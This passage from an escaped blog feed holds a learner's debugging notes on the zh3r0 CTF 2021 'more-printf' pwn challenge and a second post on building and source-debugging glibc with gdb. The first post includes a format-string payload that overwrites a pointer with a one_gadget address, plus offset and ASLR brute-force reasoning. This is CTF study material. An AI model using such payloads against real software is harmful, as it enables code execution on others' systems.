&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__libc_start_main+&lt;span class=&#34;number&#34;&gt;231&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x7ffff7a03bf7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget : &lt;span class=&#34;number&#34;&gt;0x7ffff7a313d5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;相差: onegadget-__libc_start_main+&lt;span class=&#34;number&#34;&gt;231&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0x2d7de&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;186334&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;作者认为修改的read+17这个值是修改完后才会执行到的…依据是什么呢,如果不是这样的呢?&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​	下断点: b *read 下不了…q&lt;/p&gt;
&lt;p&gt;​	要输入payload: %c%c%c%5c%hhn%*8$d%186326c%5$n	也不行&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
&lt;p&gt;​	可以下watch断点的, watch一下要修改的地方的地址&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; info b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Num     Type           Disp Enb Address            What&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;       breakpoint     keep y   &lt;span class=&#34;number&#34;&gt;0x00007ffff7a46f3f&lt;/span&gt; in __fprintf at &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;.c:&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	breakpoint already hit &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;       breakpoint     keep n   &lt;span class=&#34;number&#34;&gt;0x00007ffff7af2140&lt;/span&gt; in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;      breakpoint     keep y   &lt;span class=&#34;number&#34;&gt;0x00007ffff7af2140&lt;/span&gt; in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;下的断点没用呢… 换个patchelf试试,&lt;/p&gt;
&lt;p&gt;2.27-3ubuntu1.4&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://surager.pub/_posts/2021-05-11-x86%E6%9E%B6%E6%9E%84%E4%B8%8Bpwn%E9%A2%98%E7%9B%AElibc%E6%A6%82%E8%BF%B0/&#34;&gt;https://surager.pub/_posts/2021-05-11-x86架构下pwn题目libc概述/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先用这个吧 2.27-3ubuntu1.5_amd64&lt;/p&gt;
&lt;p&gt;进去一会后按c, 就能够进入最后的调试了,不行就下一个,继续c&lt;/p&gt;
&lt;p&gt;关键再c就退出去了..&lt;/p&gt;
&lt;p&gt;注意下断点的地址, exit可以 那是不是可以下system\execve&lt;/p&gt;
&lt;p&gt;直接q然后继续就好了&lt;/p&gt;
&lt;p&gt;gdb –pid 进去&lt;/p&gt;
&lt;h3 id=&#34;为什么这里就可以只枚举32呢&#34;&gt;&lt;a href=&#34;#为什么这里就可以只枚举32呢&#34; class=&#34;headerlink&#34; title=&#34;为什么这里就可以只枚举32呢?&#34;&gt;&lt;/a&gt;为什么这里就可以只枚举32呢?&lt;/h3&gt;&lt;p&gt;​	所以对抗alsr的点不是在onegadget这个地址上,这里是确定的, 那什么是不确定的呢?&lt;/p&gt;
&lt;p&gt;​	就是要修改的地址的地址, 它不一定是0x08,可能是0x18 28 也可能是0x00 0x20, 所以才会有32种可能&lt;/p&gt;
&lt;p&gt;​	不过在我的电脑上, 第2的字节的一半也变了…那随机化的范围又大了(关闭随机化的情况下,开启了好像又一样了)&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
&lt;h3 id=&#34;实际修改的指针&#34;&gt;&lt;a href=&#34;#实际修改的指针&#34; class=&#34;headerlink&#34; title=&#34;实际修改的指针&#34;&gt;&lt;/a&gt;实际修改的指针&lt;/h3&gt;&lt;p&gt;​	&lt;/p&gt;
&lt;p&gt;​	&lt;font color=&#34;red&#34;&gt;改的其实是上面的函数的地址(实测)  作者提出的修改read+17行不通&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153904670.png&#34; alt=&#34;image-20231111153904670&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;调试下断点和bt回溯遇到了问题&#34;&gt;&lt;a href=&#34;#调试下断点和bt回溯遇到了问题&#34; class=&#34;headerlink&#34; title=&#34;调试下断点和bt回溯遇到了问题&#34;&gt;&lt;/a&gt;调试下断点和bt回溯遇到了问题&lt;/h3&gt;&lt;p&gt;​	首先,bt回溯时候的各种问题,我认为是因为劫持控制流破坏了识别算法, 识别不出来,&lt;/p&gt;
&lt;p&gt;syscall能下断点吗&lt;/p&gt;
&lt;p&gt;do_system&lt;/p&gt;
&lt;p&gt;gdb 执行了新的sh,怎么跟踪呢? 如何看上一个进程的bt&lt;/p&gt;
&lt;p&gt;为什么会执行到上面那里呢?&lt;/p&gt;
&lt;p&gt;为什么会从那里取值rip呢?&lt;/p&gt;
&lt;p&gt;这里貌似是比较重要的函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111151211775.png&#34; alt=&#34;image-20231111151211775&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里面进行解析的吧, 是的,所以重点应该在这里&lt;/p&gt;
&lt;p&gt;printf_positional&lt;/p&gt;
&lt;p&gt;怎么样才能跟踪执行流呢&lt;/p&gt;
&lt;p&gt;故意输错 让他卡在那是不是就可以了&lt;/p&gt;
&lt;p&gt;注意看这里, 返回了最开始的栈帧,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153131246.png&#34; alt=&#34;image-20231111153131246&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;为什么只链接了那两个就可以了&#34;&gt;&lt;a href=&#34;#为什么只链接了那两个就可以了&#34; class=&#34;headerlink&#34; title=&#34;为什么只链接了那两个就可以了??????&#34;&gt;&lt;/a&gt;为什么只链接了那两个就可以了??????&lt;/h3&gt;&lt;h2 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;  buffer &amp;#x3D; (char *)malloc(0x20 + 1); &amp;#x2F;&amp;#x2F;为啥要+1? 感觉好像不加也一样&lt;/p&gt;
&lt;p&gt;​	set $rdi&amp;#x3D;_IO_stdout  ( 其他版本呢?)&lt;/p&gt;
&lt;p&gt;set *0x7ffc28b196d8&amp;#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)&lt;/p&gt;
&lt;p&gt;以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下&lt;/p&gt;
&lt;p&gt;​	如何下断点来到这里呢? 最后返回onegadget的时候下不了断点&lt;/p&gt;
&lt;p&gt;gdb启动的时候如何多下几个断点&lt;/p&gt;
&lt;p&gt;为什么会从从rsp上面取值? &lt;/p&gt;
&lt;h3 id=&#34;tips&#34;&gt;&lt;a href=&#34;#tips&#34; class=&#34;headerlink&#34; title=&#34;tips&#34;&gt;&lt;/a&gt;tips&lt;/h3&gt;&lt;p&gt;gdb中如何关了alsr调试呢&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;set disable-randomization on 关闭&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set disable-randomization off 开启&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/85785&#34;&gt;https://www.anquanke.com/post/id/85785&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/12304&#34;&gt;https://xz.aliyun.com/t/12304&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hakuya.work/post/2&#34;&gt;https://www.hakuya.work/post/2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/&#34;&gt;https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln&#34;&gt;https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/&#34;&gt;https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://sangjun.xyz/125&#34;&gt;https://sangjun.xyz/125&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;感觉前面几个讲的方法最后一步都有问题&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/&#34;&gt;https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这一篇或许是对的&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-11-12T15:40:29.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/</id>
        <title>pwn入门-46-glibc源码调试</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/"/>
        <content type="html">&lt;p&gt;​	有时候需要看库函数哪里出问题了,有源码调试的话,看起来会更直观和方便&lt;/p&gt;
&lt;h1 id=&#34;glibc源代码调试&#34;&gt;&lt;a href=&#34;#glibc源代码调试&#34; class=&#34;headerlink&#34; title=&#34;glibc源代码调试&#34;&gt;&lt;/a&gt;glibc源代码调试&lt;/h1&gt;&lt;p&gt;​	开启gdb后 dir  xxxx目录 即可&lt;/p&gt;
&lt;p&gt;​	但dir命令加载源码只能指定单个目录或文件,在gdb启动的时候用这个命令来加载glibc源码进去就好了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gdb `find ~/path/to/glibc/source -type d -&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;-d %p &amp;#x27;&lt;/span&gt;` ./a.out&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;当前机器版本libc&#34;&gt;&lt;a href=&#34;#当前机器版本libc&#34; class=&#34;headerlink&#34; title=&#34;当前机器版本libc&#34;&gt;&lt;/a&gt;当前机器版本libc&lt;/h2&gt;&lt;p&gt;​	安装带调试版本libc&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt install libc6-dbg  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt install libc6-dbg:i386&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	下载对应的源代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt; 修改/etc/apt/sources.&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; 开启deb-src (不知道是不是都要开)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2.&lt;/span&gt; apt update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3.&lt;/span&gt; apt source libc6-dev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	注意第三步会在当前目录进行下载&lt;/p&gt;
&lt;p&gt;​	调试的时候进行指定即可: gdb -q .&amp;#x2F;pwn -d &amp;#x2F;xxx&amp;#x2F;xxx&amp;#x2F;glibc-2.31&amp;#x2F; &lt;/p&gt;
&lt;h1 id=&#34;不同版本glibc下载与编译&#34;&gt;&lt;a href=&#34;#不同版本glibc下载与编译&#34; class=&#34;headerlink&#34; title=&#34;不同版本glibc下载与编译&#34;&gt;&lt;/a&gt;不同版本glibc下载与编译&lt;/h1&gt;&lt;h2 id=&#34;官方下载与编译&#34;&gt;&lt;a href=&#34;#官方下载与编译&#34; class=&#34;headerlink&#34; title=&#34;官方下载与编译&#34;&gt;&lt;/a&gt;官方下载与编译&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://ftp.gnu.org/gnu/glibc/&#34;&gt;https://ftp.gnu.org/gnu/glibc/&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone git://sourceware.org/git/glibc.git &amp;amp;&amp;amp; cd glibc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git checkout glibc-2.31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir build &amp;amp;&amp;amp; cd build&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;../configure --prefix=/usr/local/glibc-2.31-debug --enable-debug=yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make -j16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make install    # 这时候/usr/local/glibc-2.31-debug/就有文件了 包含库文件和头文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;查看当前分支: git branch&lt;/p&gt;
&lt;p&gt;查看有哪些分支: git branch -a&lt;/p&gt;
&lt;h3 id=&#34;指定编译好的库进行文件编译&#34;&gt;&lt;a href=&#34;#指定编译好的库进行文件编译&#34; class=&#34;headerlink&#34; title=&#34;指定编译好的库进行文件编译&#34;&gt;&lt;/a&gt;指定编译好的库进行文件编译&lt;/h3&gt;&lt;p&gt;​	–rpath指定共享库路径  -I指定动态链接器&lt;/p&gt;
&lt;p&gt;​	就可以用指定的libc来编译代码了, 这样的话, 也会很自然就有glibc的源代码可以调试了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gcc -L/usr/local/glibc&lt;span class=&#34;number&#34;&gt;-2.31&lt;/span&gt;-debug/lib -Wl,--rpath=/usr/local/glibc&lt;span class=&#34;number&#34;&gt;-2.31&lt;/span&gt;-debug/lib -Wl,-I/usr/local/glibc&lt;span class=&#34;number&#34;&gt;-2.31&lt;/span&gt;-debug/lib/ld&lt;span class=&#34;number&#34;&gt;-2.31&lt;/span&gt;.so hello.c -o hello&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	为什么不用加 -g了? (需要的,如果要看hello.c的源代码的话)&lt;/p&gt;
&lt;p&gt;​	但是用glibcallinone下载的不行..有问题, 那是因为它只有编译好的库,没有头文件之类的吧?&lt;/p&gt;
&lt;h2 id=&#34;glibc-all-in-one工具&#34;&gt;&lt;a href=&#34;#glibc-all-in-one工具&#34; class=&#34;headerlink&#34; title=&#34;glibc-all-in-one工具&#34;&gt;&lt;/a&gt;glibc-all-in-one工具&lt;/h2&gt;&lt;p&gt;​	这里是编译好的,一般都是带符号的,但是如果需要源代码调试还是需要下载源码并加载进gdb里面进行调试&lt;/p&gt;
&lt;p&gt;​	&lt;a href=&#34;https://blog.csdn.net/csdn546229768/article/details/122691241&#34;&gt;https://blog.csdn.net/csdn546229768/article/details/122691241&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​	如果网站里没有的话,就修改download源代码, 换个source看看,google精准搜索搜索一下&lt;/p&gt;
&lt;h3 id=&#34;debug信息&#34;&gt;&lt;a href=&#34;#debug信息&#34; class=&#34;headerlink&#34; title=&#34;debug信息&#34;&gt;&lt;/a&gt;debug信息&lt;/h3&gt;&lt;p&gt;​	符号文件在哪呢, 被编译进程序里了吧,我记得之前有单独的符号文件的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231023223614611.png&#34; alt=&#34;image-20231023223614611&#34;&gt;&lt;/p&gt;
&lt;p&gt;ls -al &amp;#x2F;usr&amp;#x2F;lib&amp;#x2F;debug&amp;#x2F;.build-id&amp;#x2F;这里有&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x   &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; root root  &lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;月  &lt;span class=&#34;number&#34;&gt;27&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drwxr-xr-x &lt;span class=&#34;number&#34;&gt;236&lt;/span&gt; root root  &lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;月  &lt;span class=&#34;number&#34;&gt;27&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt; ..&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;number&#34;&gt;23496&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;月   &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;2022&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;329f&lt;/span&gt;3d85e153a01672b77b853beda0faf0dee6.debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;number&#34;&gt;20104&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;月   &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;2022&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;9f&lt;/span&gt;5043bbf7cfbf4dfd27684d9c3cbcbb835bd9.debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;number&#34;&gt;19468&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;月   &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;2022&lt;/span&gt; b0728b23be4032704a004d8066a268c4b6924a.debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;number&#34;&gt;20052&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;月   &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;2022&lt;/span&gt; bbb582f3d2cd3464764682f1937b4e3d9c2641.debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;number&#34;&gt;22200&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;月   &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;2022&lt;/span&gt; c4ae3a65bc87ea96986b3b2441e892c8a433f0.debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-rw-r--r--   &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;number&#34;&gt;22168&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;月   &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;number&#34;&gt;2022&lt;/span&gt; cd9124f765fe93560701d55d5c61c37be4657a.debug&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;但是glibcallinone里没找到这个呀…&lt;/p&gt;
&lt;p&gt;他们之间是什么关系呢?&lt;/p&gt;
&lt;h2 id=&#34;libc编译案例&#34;&gt;&lt;a href=&#34;#libc编译案例&#34; class=&#34;headerlink&#34; title=&#34;libc编译案例&#34;&gt;&lt;/a&gt;libc编译案例&lt;/h2&gt;&lt;p&gt;​	做一道题需要23版本的libc,用ubuntu20编译的有问题..换18试试 (也有很多报错, 难道得换debian?)&lt;/p&gt;
&lt;p&gt;​	source是源码,右边是编译好的,但是没有符号信息&lt;/p&gt;
&lt;p&gt;​	难道版本不对? 这个source看起来是没有什么问题的,下载后看了下源码文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231023213302220.png&#34; alt=&#34;image-20231023213302220&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu11&#34;&gt;https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu11&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://launchpadlibrarian.net/409875491/libc6_2.23-0ubuntu11_amd64.deb&#34;&gt;http://launchpadlibrarian.net/409875491/libc6_2.23-0ubuntu11_amd64.deb&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkdir build &amp;amp;&amp;amp; cd build&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;../configure --prefix=/usr/local/glibc&lt;span class=&#34;number&#34;&gt;-2.23&lt;/span&gt;-debug --enable-debug=yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make -j16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make install    # 这时候/usr/local/glibc&lt;span class=&#34;number&#34;&gt;-2.23&lt;/span&gt;-debug/就有文件了 